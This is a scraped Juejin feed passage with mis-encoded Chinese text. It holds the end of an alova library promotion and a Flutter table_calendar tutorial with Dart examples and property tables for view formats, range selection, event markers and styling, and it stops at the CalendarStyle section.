<p>å¦‚æœè§‰å¾—alovaè¿˜ä¸é”™ï¼ŒçœŸè¯šå¸Œæœ›ä½ å¯ä»¥<a href="https://link.juejin.cn?target=https%3A%2F%2Falova.js.org%2Fexamples" target="_blank" title="https://alova.js.org/examples" ref="nofollow noopener noreferrer">å°è¯•ä½“éªŒä¸€ä¸‹</a>ï¼Œä¹Ÿå¯ä»¥ç»™æˆ‘ä»¬æ¥ä¸€ä¸ªå…è´¹çš„<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Falovajs%2Falova" target="_blank" title="https://github.com/alovajs/alova" ref="nofollow noopener noreferrer">github stars</a>ã€‚</p>
<p>è®¿é—®alovajsçš„å®˜ç½‘æŸ¥çœ‹æ›´å¤šè¯¦ç»†ä¿¡æ¯ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Falova.js.org" target="_blank" title="https://alova.js.org" ref="nofollow noopener noreferrer">alovajså®˜ç½‘</a>ã€‚</p>
<p>æœ‰å…´è¶£å¯ä»¥åŠ å…¥æˆ‘ä»¬çš„äº¤æµç¤¾åŒºï¼Œåœ¨ç¬¬ä¸€æ—¶é—´è·å–åˆ°æœ€æ–°è¿›å±•ï¼Œä¹Ÿèƒ½ç›´æ¥å’Œå¼€å‘å›¢é˜Ÿäº¤æµï¼Œæå‡ºä½ çš„æƒ³æ³•å’Œå»ºè®®ã€‚</p>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Falova.js.org%2Fimg%2Fwechat_qrcode.jpg" target="_blank" title="https://alova.js.org/img/wechat_qrcode.jpg" ref="nofollow noopener noreferrer">åŠ å…¥å¾®ä¿¡ç¾¤å‚ä¸äº¤æµ</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fdiscord.gg%2FS47QGJgkVb" target="_blank" title="https://discord.gg/S47QGJgkVb" ref="nofollow noopener noreferrer">åŠ å…¥åœ¨ Discord ç¤¾åŒºå‚ä¸äº¤æµ</a></li>
</ul>
<p>æœ‰ä»»ä½•é—®é¢˜ï¼Œä½ å¯ä»¥åŠ å…¥ä»¥ä¸‹ç¾¤èŠå’¨è¯¢ï¼Œä¹Ÿå¯ä»¥åœ¨<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Falovajs%2Falova%2Fdiscussions" target="_blank" title="https://github.com/alovajs/alova/discussions" ref="nofollow noopener noreferrer">github ä»“åº“ä¸­å‘å¸ƒ Discussions</a>ï¼Œå¦‚æœé‡åˆ°é—®é¢˜ï¼Œä¹Ÿè¯·åœ¨<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Falovajs%2Falova%2Fissues" target="_blank" title="https://github.com/alovajs/alova/issues" ref="nofollow noopener noreferrer">github çš„ issues</a>ä¸­æäº¤ï¼Œæˆ‘ä»¬ä¼šåœ¨æœ€å¿«çš„æ—¶é—´è§£å†³ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Flutterè‡ªå®šä¹‰æ—¥å†table_calendarå®Œå…¨æŒ‡å—+æ¡ˆä¾‹]]></title>    <link>https://juejin.cn/post/7581693431740448831</link>    <guid>https://juejin.cn/post/7581693431740448831</guid>    <pubDate>2025-12-10T00:45:26.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581693431740448831" data-draft-id="7581097545671376915" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content=" Flutterè‡ªå®šä¹‰æ—¥å†table_calendarå®Œå…¨æŒ‡å—+æ¡ˆä¾‹"/> <meta itemprop="keywords" content="å‰ç«¯,Flutter,Android"/> <meta itemprop="datePublished" content="2025-12-10T00:45:26.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="é¹å¤šå¤š"/> <meta itemprop="url" content="https://juejin.cn/user/747323639737191"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
             Flutterè‡ªå®šä¹‰æ—¥å†table_calendarå®Œå…¨æŒ‡å—+æ¡ˆä¾‹
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/747323639737191/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    é¹å¤šå¤š
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-10T00:45:26.000Z" title="Wed Dec 10 2025 00:45:26 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-10
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    1
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»7åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body{word-break:break-word;line-height:2;font-weight:400;font-size:15px;overflow-x:hidden;color:#333;letter-spacing:1.2px}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1:first-child,.markdown-body h2:first-child,.markdown-body h3:first-child,.markdown-body h4:first-child,.markdown-body h5:first-child,.markdown-body h6:first-child{margin-top:-1.5rem;margin-bottom:1rem}.markdown-body h1:before,.markdown-body h2:before,.markdown-body h3:before,.markdown-body h4:before,.markdown-body h5:before,.markdown-body h6:before{content:"#";display:inline-block;color:#3eaf7c;padding-right:.23em}.markdown-body h1{position:relative;font-size:2.5rem;margin-bottom:5px}.markdown-body h1:before{font-size:2.5rem}.markdown-body h2{padding-bottom:.5rem;font-size:2.2rem;border-bottom:1px solid #ececec}.markdown-body h3{font-size:1.5rem;padding-bottom:0}.markdown-body h4{font-size:1.25rem}.markdown-body h5{font-size:1rem}.markdown-body h6{margin-top:5px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body strong{color:#3eaf7c}.markdown-body img{max-width:100%;border-radius:2px;display:block;margin:auto}.markdown-body hr{border:none;border-top:1px solid #3eaf7c;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;overflow-x:auto;padding:.2rem .5rem;margin:0;color:#3eaf7c;font-size:.85em;background-color:rgba(27,31,35,.05);border-radius:3px}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75;border:.5rem solid #3eaf7c}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{font-weight:500;text-decoration:none;color:#3eaf7c;margin:0 5px}.markdown-body a:active,.markdown-body a:hover{text-decoration:none;border-bottom:1.5px solid #3eaf7c}.markdown-body a[href^=http]:after{content:url("data:image/svg+xml;base64,PHN2ZyBjbGFzcz0iaWNvbiIgdmlld0JveD0iMCAwIDEwMjQgMTAyNCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB3aWR0aD0iMTQiIGhlaWdodD0iMTQiPjxkZWZzPjxzdHlsZS8+PC9kZWZzPjxwYXRoIGQ9Ik04MzIgMTI4SDY0MHY2NGgxNDYuNzUyTDUyMS4zNzYgNDU3LjM3Nmw0NS4yNDggNDUuMjQ4TDgzMiAyMzcuMjQ4VjM4NGg2NFYxMjh6IiBmaWxsPSIjM2VhZjdjIi8+PHBhdGggZD0iTTc2OCA4MzJIMTkyVjI1NmgzNTJ2LTY0SDE2MGEzMiAzMiAwIDAwLTMyIDMydjY0MGEzMiAzMiAwIDAwMzIgMzJoNjQwYTMyIDMyIDAgMDAzMi0zMlY0ODBoLTY0djM1MnoiIGZpbGw9IiMzZWFmN2MiLz48L3N2Zz4=");margin-left:2px}.markdown-body a[href^="#"]:before{content:"#"}.markdown-body table{display:inline-block!important;font-size:13px;width:auto;max-width:100%;overflow:auto;border:1px solid #3eaf7c;border-collapse:collapse}.markdown-body thead{background:#3eaf7c;color:#fff;text-align:left}.markdown-body tr:nth-child(2n){background-color:rgba(153,255,188,.1)}.markdown-body td,.markdown-body th{padding:4px 8px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#7b7878;padding:1px 23px;border-left:.5rem solid;border-color:#42b983;background-color:rgba(66,184,131,.1);position:relative;margin:14px 8px 0}.markdown-body blockquote:before{display:inline-block;position:absolute;content:url("data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMjUiIGhlaWdodD0iMjUiIHZpZXdCb3g9IjAgMCAyNyAyNyIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj48ZyB0cmFuc2Zvcm09InRyYW5zbGF0ZSgxLjg2MiAxLjg2MikiIGZpbGwtcnVsZT0ibm9uemVybyIgZmlsbD0ibm9uZSI+PGNpcmNsZSBzdHJva2U9IiNGRkYiIHN0cm9rZS13aWR0aD0iMS43MjQiIGZpbGw9IiM0MkI5ODMiIGN4PSIxMS42MzgiIGN5PSIxMS42MzgiIHI9IjExLjYzOCIvPjxwYXRoIGQ9Ik0xNC45NzggNi4yN0E1LjAwNiA1LjAwNiAwIDAwNi42NyA5LjQ2OGE0LjkwMSA0LjkwMSAwIDAwMS43NzMgNC4zNjJjLjMyMy4yNTguNTE0LjY0Ny41MjIgMS4wNnYxLjA2YTIuNjg1IDIuNjg1IDAgMDA1LjM3IDB2LTEuMDA4Yy4wMDItLjM5OC4xNzMtLjc3Ny40Ny0xLjA0MmE1LjAyMyA1LjAyMyAwIDAwLjE3My03LjYzem0tMy4zMzcgMTAuOTY3YTEuMzA0IDEuMzA0IDAgMDEtMS4yODYtMS4yODd2LS4yNzhoMi41NzJ2LjI2MWMwIC43MTMtLjU3MyAxLjI5NC0xLjI4NiAxLjMwNHptMi4yNi00LjQxNWMtLjQ0LjM4My0uNzUuODkzLS44ODcgMS40NmgtMi43NDZhMi44NjggMi44NjggMCAwMC0uOTM4LTEuNTNoLS4wMThhMy40NzYgMy40NzYgMCAwMS0xLjI2OS0zLjE0NSAzLjYxNSAzLjYxNSAwIDAxNy4xOTYuNCAzLjY1IDMuNjUgMCAwMS0xLjMzOCAyLjgxNXoiIGZpbGw9IiNGRkYiLz48L2c+PC9zdmc+");width:25px;height:25px;left:-16px;top:12px}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body details{outline:none;border:none;border-left:4px solid #3eaf7c;padding-left:10px;margin-left:4px}.markdown-body details summary{cursor:pointer;border:none;outline:none;background:#fff;margin:0 -17px}.markdown-body details summary::-webkit-details-marker{color:#3eaf7c}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body ol li::marker{color:#3eaf7c}.markdown-body ul li{list-style:none;padding-left:10px}.markdown-body ul li::marker{content:"â€¢";color:#3eaf7c}.markdown-body ul li.task-list-item:before{content:"";margin-right:0}.markdown-body input[type=checkbox]{vertical-align:text-bottom;box-shadow:inset 0 0 0 10px #fff}.markdown-body input[type=checkbox]:before{content:url("data:image/svg+xml;base64,PHN2ZyBjbGFzcz0iaWNvbiIgdmlld0JveD0iMCAwIDEwMjQgMTAyNCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB3aWR0aD0iMTYiIGhlaWdodD0iMTYiPjxkZWZzPjxzdHlsZS8+PC9kZWZzPjxwYXRoIGQ9Ik04NzcuMDU2IDE0Ni45NDR2NzMwLjExMkgxNDYuOTQ0VjE0Ni45NDRoNzMwLjExMnptMC0xMDQuMjc3SDE0Ni45NDRjLTU3LjYyOCAwLTEwNC4yNzcgNDYuNjQ5LTEwNC4yNzcgMTA0LjI3N3Y3MzAuMTEyYzAgNTcuNjI4IDQ2LjY0OSAxMDQuMjc3IDEwNC4yNzcgMTA0LjI3N2g3MzAuMTEyYzU3LjYyOCAwIDEwNC4yNzctNDYuNjQ5IDEwNC4yNzctMTA0LjI3N1YxNDYuOTQ0YzAtNTcuNjI4LTQ2LjY0OS0xMDQuMjc3LTEwNC4yNzctMTA0LjI3N3oiIGZpbGw9IiMzZWFmN2MiLz48L3N2Zz4=");position:relative;top:-2px;right:2px}.markdown-body input[type=checkbox]:checked:before{content:url("data:image/svg+xml;base64,PHN2ZyBjbGFzcz0iaWNvbiIgdmlld0JveD0iMCAwIDEwMjQgMTAyNCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB3aWR0aD0iMTUiIGhlaWdodD0iMTUiPjxkZWZzPjxzdHlsZS8+PC9kZWZzPjxwYXRoIGQ9Ik05MTAuMjA4IDBIMTEzLjc2QTExNC4xMTIgMTE0LjExMiAwIDAwLS4wMzIgMTEzLjc5MlY5MTAuMjRjMCA2Mi41OTIgNTEuMiAxMTMuNzkyIDExMy43OTIgMTEzLjc5Mmg3OTYuNDQ4YzYyLjU5MiAwIDExMy43OTItNTEuMiAxMTMuNzkyLTExMy43OTJWMTEzLjc5MkMxMDI0IDUxLjIgOTcyLjggMCA5MTAuMjA4IDB6bS01MTIgNzk2LjQ0OEwxMTMuNzYgNTEybDc5LjY0OC03OS42NDggMjA0LjggMjA0LjhMODMwLjU2IDIwNC44bDc5LjY0OCA3OS42NDgtNTEyIDUxMnoiIGZpbGw9IiMzZWFmN2MiLz48L3N2Zz4=");position:relative;top:-2px;right:2px}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="agate">.markdown-body pre,.markdown-body pre&gt;code.hljs{background:#333;color:#fff}.hljs-name,.hljs-strong{font-weight:700}.hljs-code,.hljs-emphasis{font-style:italic}.hljs-tag{color:#62c8f3}.hljs-selector-class,.hljs-selector-id,.hljs-template-variable,.hljs-variable{color:#ade5fc}.hljs-bullet,.hljs-string{color:#a2fca2}.hljs-attribute,.hljs-built_in,.hljs-builtin-name,.hljs-quote,.hljs-section,.hljs-title,.hljs-type{color:#ffa}.hljs-bullet,.hljs-number,.hljs-symbol{color:#d36363}.hljs-keyword,.hljs-literal,.hljs-selector-tag{color:#fcc28c}.hljs-code,.hljs-comment,.hljs-deletion{color:#888}.hljs-link,.hljs-regexp{color:#c6b4f0}.hljs-meta{color:#fc9b9b}.hljs-deletion{background-color:#fc9b9b;color:#333}.hljs-addition{background-color:#a2fca2;color:#333}.hljs a{color:inherit}.hljs a:focus,.hljs a:hover{color:inherit;text-decoration:underline}</style><h2 data-id="heading-0">1. ç®€ä»‹</h2>
<p><code>table_calendar</code> æ˜¯ Flutter ç”Ÿæ€ä¸­åŠŸèƒ½å¼ºå¤§çš„æ—¥å†ç»„ä»¶ï¼Œæ”¯æŒå¤šç§è§†å›¾åˆ‡æ¢ã€äº‹ä»¶æ ‡è®°ã€æ—¥æœŸèŒƒå›´é€‰æ‹©ç­‰æ ¸å¿ƒåŠŸèƒ½ï¼Œé€‚åˆéœ€é›†æˆæ—¥å†åŠŸèƒ½çš„åº”ç”¨åœºæ™¯ï¼ˆå¦‚æ—¥ç¨‹ç®¡ç†ã€é¢„çº¦ç³»ç»Ÿç­‰ï¼‰ã€‚å…¶é«˜åº¦å¯å®šåˆ¶åŒ–çš„ç‰¹æ€§ä½¿å…¶èƒ½é€‚é…ä¸åŒçš„ UI éœ€æ±‚ã€‚</p>
<h2 data-id="heading-1">2. åŸºç¡€é…ç½®</h2>
<h3 data-id="heading-2">å®‰è£…</h3>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-attr">dependencies:</span>
  <span class="hljs-attr">table_calendar:</span> <span class="hljs-string">^3.0.1</span>  <span class="hljs-comment"># è¯·ä½¿ç”¨æœ€æ–°ç‰ˆæœ¬</span>
</code></pre>
<h3 data-id="heading-3">æœ€ç®€å®ç°</h3>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-keyword">import</span> <span class="hljs-string">'package:table_calendar/table_calendar.dart'</span>;

TableCalendar(
  firstDay: <span class="hljs-built_in">DateTime</span>(<span class="hljs-number">2020</span>),
  lastDay: <span class="hljs-built_in">DateTime</span>(<span class="hljs-number">2030</span>),
  focusedDay: <span class="hljs-built_in">DateTime</span>.now(),
  selectedDayPredicate: (day) {
    <span class="hljs-keyword">return</span> isSameDay(_selectedDay, day);
  },
  onDaySelected: (selectedDay, focusedDay) {
    setState(() {
      _selectedDay = selectedDay;
      _focusedDay = focusedDay;
    });
  },
)
</code></pre>
<p>æ ¸å¿ƒå‚æ•°è¯´æ˜ï¼š</p>
<ul>
<li><code>firstDay</code>/<code>lastDay</code>ï¼šæ—¥å†æ˜¾ç¤ºèŒƒå›´ï¼ˆå¿…ä¼ ï¼‰</li>
<li><code>focusedDay</code>ï¼šå½“å‰èšç„¦çš„æ—¥æœŸï¼ˆæ§åˆ¶æ»šåŠ¨ä½ç½®ï¼Œå¿…ä¼ ï¼‰</li>
<li><code>selectedDayPredicate</code>ï¼šåˆ¤æ–­æ—¥æœŸæ˜¯å¦è¢«é€‰ä¸­çš„æ¡ä»¶</li>
<li><code>onDaySelected</code>ï¼šæ—¥æœŸé€‰æ‹©å›è°ƒï¼ˆè¿”å›é€‰ä¸­æ—¥æœŸå’Œæ–°èšç„¦æ—¥æœŸï¼‰</li>
</ul>
<h2 data-id="heading-4">3. æ ¸å¿ƒå±æ€§å…¨è§£æ</h2>
<h3 data-id="heading-5">3.1. æ ¸å¿ƒåŸºç¡€å±æ€§</h3>








































<table><thead><tr><th>å±æ€§å</th><th>ç±»å‹</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td><code>firstDay</code></td><td><code>DateTime</code></td><td>æ—¥å†æ˜¾ç¤ºçš„èµ·å§‹æ—¥æœŸï¼ˆå¿…ä¼ ï¼‰</td></tr><tr><td><code>lastDay</code></td><td><code>DateTime</code></td><td>æ—¥å†æ˜¾ç¤ºçš„ç»“æŸæ—¥æœŸï¼ˆå¿…ä¼ ï¼‰</td></tr><tr><td><code>focusedDay</code></td><td><code>DateTime</code></td><td>å½“å‰èšç„¦çš„æ—¥æœŸï¼ˆå¿…ä¼ ï¼Œæ§åˆ¶æ—¥å†æ»šåŠ¨ä½ç½®ï¼‰</td></tr><tr><td><code>selectedDayPredicate</code></td><td><code>bool Function(DateTime)</code></td><td>åˆ¤æ–­æ—¥æœŸæ˜¯å¦è¢«é€‰ä¸­çš„æ¡ä»¶</td></tr><tr><td><code>onDaySelected</code></td><td><code>void Function(DateTime, DateTime)</code></td><td>å•ä¸ªæ—¥æœŸé€‰ä¸­å›è°ƒï¼ˆé€‰ä¸­æ—¥æœŸ+èšç„¦æ—¥æœŸï¼‰</td></tr><tr><td><code>onPageChanged</code></td><td><code>void Function(DateTime)</code></td><td>æ—¥å†é¡µé¢åˆ‡æ¢æ—¶å›è°ƒï¼ˆè¿”å›æ–°èšç„¦æ—¥æœŸï¼‰</td></tr></tbody></table>
<h3 data-id="heading-6">3.2. è§†å›¾æ§åˆ¶å±æ€§</h3>








































<table><thead><tr><th>å±æ€§å</th><th>ç±»å‹</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td><code>calendarFormat</code></td><td><code>CalendarFormat</code></td><td>æ—¥å†å±•ç¤ºæ ¼å¼ï¼ˆmonth/week/twoWeeksï¼‰</td></tr><tr><td><code>onFormatChanged</code></td><td><code>void Function(CalendarFormat)</code></td><td>è§†å›¾æ ¼å¼åˆ‡æ¢å›è°ƒ</td></tr><tr><td><code>availableCalendarFormats</code></td><td><code>Map&lt;CalendarFormat, String&gt;</code></td><td>å…è®¸çš„è§†å›¾æ ¼å¼åŠå¯¹åº”æ˜¾ç¤ºæ–‡æœ¬</td></tr><tr><td><code>pageJumpingEnabled</code></td><td><code>bool</code></td><td>æ˜¯å¦å…è®¸ç‚¹å‡»è¡¨å¤´æœˆä»½å¿«é€Ÿè·³è½¬é¡µé¢ï¼ˆé»˜è®¤trueï¼‰</td></tr><tr><td><code>weekNumbersVisible</code></td><td><code>bool</code></td><td>æ˜¯å¦æ˜¾ç¤ºå‘¨æ•°ï¼ˆé»˜è®¤falseï¼‰</td></tr><tr><td><code>weekNumberStyle</code></td><td><code>TextStyle</code></td><td>å‘¨æ•°æ–‡æœ¬æ ·å¼</td></tr></tbody></table>
<p>ç¤ºä¾‹ï¼š</p>
<pre><code class="hljs language-dart" lang="dart">TableCalendar(
  <span class="hljs-comment">// ...åŸºç¡€å‚æ•°</span>
  calendarFormat: _calendarFormat,
  onFormatChanged: (format) {
    setState(() {
      _calendarFormat = format;
    });
  },
  availableCalendarFormats: {
    CalendarFormat.month: <span class="hljs-string">'æœˆ'</span>,
    CalendarFormat.week: <span class="hljs-string">'å‘¨'</span>,
    CalendarFormat.twoWeeks: <span class="hljs-string">'ä¸¤å‘¨'</span>,
  },
)
</code></pre>
<h3 data-id="heading-7">3.3. èŒƒå›´é€‰æ‹©å±æ€§</h3>



































<table><thead><tr><th>å±æ€§å</th><th>ç±»å‹</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td><code>rangeStartDay</code></td><td><code>DateTime?</code></td><td>èŒƒå›´é€‰æ‹©çš„èµ·å§‹æ—¥æœŸ</td></tr><tr><td><code>rangeEndDay</code></td><td><code>DateTime?</code></td><td>èŒƒå›´é€‰æ‹©çš„ç»“æŸæ—¥æœŸ</td></tr><tr><td><code>rangeSelectionMode</code></td><td><code>RangeSelectionMode</code></td><td>èŒƒå›´é€‰æ‹©æ¨¡å¼ï¼ˆtoggledOff/toggledOn/forcedï¼‰</td></tr><tr><td><code>onRangeSelected</code></td><td><code>void Function(DateTime?, DateTime?, DateTime)</code></td><td>èŒƒå›´é€‰æ‹©å›è°ƒï¼ˆèµ·å§‹/ç»“æŸ/èšç„¦æ—¥æœŸï¼‰</td></tr><tr><td><code>rangeDayPredicate</code></td><td><code>bool Function(DateTime)</code></td><td>åˆ¤æ–­æ—¥æœŸæ˜¯å¦å…è®¸è¢«çº³å…¥èŒƒå›´é€‰æ‹©</td></tr></tbody></table>
<p>ç¤ºä¾‹ï¼š</p>
<pre><code class="hljs language-dart" lang="dart">RangeSelectionMode _rangeSelectionMode = RangeSelectionMode.toggledOff;
<span class="hljs-built_in">DateTime?</span> _rangeStart;
<span class="hljs-built_in">DateTime?</span> _rangeEnd;

TableCalendar(
  <span class="hljs-comment">// ...åŸºç¡€å‚æ•°</span>
  rangeStartDay: _rangeStart,
  rangeEndDay: _rangeEnd,
  rangeSelectionMode: _rangeSelectionMode,
  onRangeSelected: (start, end, focusedDay) {
    setState(() {
      _rangeStart = start;
      _rangeEnd = end;
      _rangeSelectionMode = RangeSelectionMode.toggledOn;
      _selectedDay = <span class="hljs-keyword">null</span>;  <span class="hljs-comment">// æ¸…é™¤å•ä¸ªé€‰ä¸­</span>
    });
  },
)
</code></pre>
<h3 data-id="heading-8">3.4. äº‹ä»¶ä¸æ ‡è®°å±æ€§</h3>






























<table><thead><tr><th>å±æ€§å</th><th>ç±»å‹</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td><code>eventLoader</code></td><td><code>List&lt;Object&gt; Function(DateTime)</code></td><td>åŠ è½½æŒ‡å®šæ—¥æœŸçš„äº‹ä»¶æ•°æ®</td></tr><tr><td><code>calendarBuilders</code></td><td><code>CalendarBuilders</code></td><td>è‡ªå®šä¹‰æ—¥å†å…ƒç´ æ„å»ºå™¨ï¼ˆæ ‡è®°/æ—¥æœŸç­‰ï¼‰</td></tr><tr><td><code>holidayLoader</code></td><td><code>List&lt;Object&gt; Function(DateTime)</code></td><td>åŠ è½½æŒ‡å®šæ—¥æœŸçš„å‡æ—¥æ•°æ®</td></tr><tr><td><code>eventFadeTransitionEnabled</code></td><td><code>bool</code></td><td>äº‹ä»¶æ ‡è®°æ˜¯å¦å¯ç”¨æ·¡å…¥åŠ¨ç”»ï¼ˆé»˜è®¤trueï¼‰</td></tr></tbody></table>
<p>ç¤ºä¾‹ï¼š</p>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-comment">// å®šä¹‰äº‹ä»¶æ•°æ®ç»“æ„</span>
<span class="hljs-keyword">final</span> <span class="hljs-built_in">Map</span>&lt;<span class="hljs-built_in">DateTime</span>, <span class="hljs-built_in">List</span>&gt; _events = {
  <span class="hljs-built_in">DateTime</span>(<span class="hljs-number">2023</span>, <span class="hljs-number">10</span>, <span class="hljs-number">15</span>): [<span class="hljs-string">'ä¼šè®®'</span>, <span class="hljs-string">'ç”Ÿæ—¥'</span>],
  <span class="hljs-built_in">DateTime</span>(<span class="hljs-number">2023</span>, <span class="hljs-number">10</span>, <span class="hljs-number">20</span>): [<span class="hljs-string">'deadline'</span>],
};

TableCalendar(
  <span class="hljs-comment">// ...å…¶ä»–å‚æ•°</span>
  eventLoader: (day) {
    <span class="hljs-keyword">return</span> _events[day] ?? [];
  },
  calendarBuilders: CalendarBuilders(
    markerBuilder: (context, date, events) {
      <span class="hljs-keyword">if</span> (events.isEmpty) <span class="hljs-keyword">return</span> SizedBox();
      <span class="hljs-keyword">return</span> Positioned(
        bottom: <span class="hljs-number">1</span>,
        child: Container(
          width: <span class="hljs-number">16</span>,
          height: <span class="hljs-number">4</span>,
          decoration: BoxDecoration(
            color: Colors.blue,
            borderRadius: BorderRadius.circular(<span class="hljs-number">2</span>),
          ),
        ),
      );
    },
  ),
)
</code></pre>
<h3 data-id="heading-9">3.5. æ ·å¼å®šåˆ¶å±æ€§</h3>


















































<table><thead><tr><th>å±æ€§å</th><th>ç±»å‹</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td><code>calendarStyle</code></td><td><code>CalendarStyle</code></td><td>æ—¥å†ä¸»ä½“æ ·å¼é…ç½®</td></tr><tr><td><code>headerStyle</code></td><td><code>HeaderStyle</code></td><td>è¡¨å¤´ï¼ˆæœˆä»½æ ï¼‰æ ·å¼é…ç½®</td></tr><tr><td><code>daysOfWeekStyle</code></td><td><code>DaysOfWeekStyle</code></td><td>æ˜ŸæœŸæ ‡é¢˜æ ·å¼é…ç½®</td></tr><tr><td><code>rowHeight</code></td><td><code>double</code></td><td>æ—¥å†è¡Œé«˜ï¼ˆå½±å“æ•´ä½“é«˜åº¦ï¼‰</td></tr><tr><td><code>columnWidth</code></td><td><code>double?</code></td><td>æ—¥å†åˆ—å®½ï¼ˆnullæ—¶è‡ªåŠ¨è®¡ç®—ï¼‰</td></tr><tr><td><code>padding</code></td><td><code>EdgeInsets</code></td><td>æ—¥å†å†…è¾¹è·</td></tr><tr><td><code>margin</code></td><td><code>EdgeInsets</code></td><td>æ—¥å†å¤–è¾¹è·</td></tr><tr><td><code>clipBehavior</code></td><td><code>Clip</code></td><td>è£å‰ªè¡Œä¸ºï¼ˆé»˜è®¤Clip.hardEdgeï¼‰</td></tr></tbody></table>
<h4 data-id="heading-10">CalendarStyle å­å±æ€§</h4>



















































































































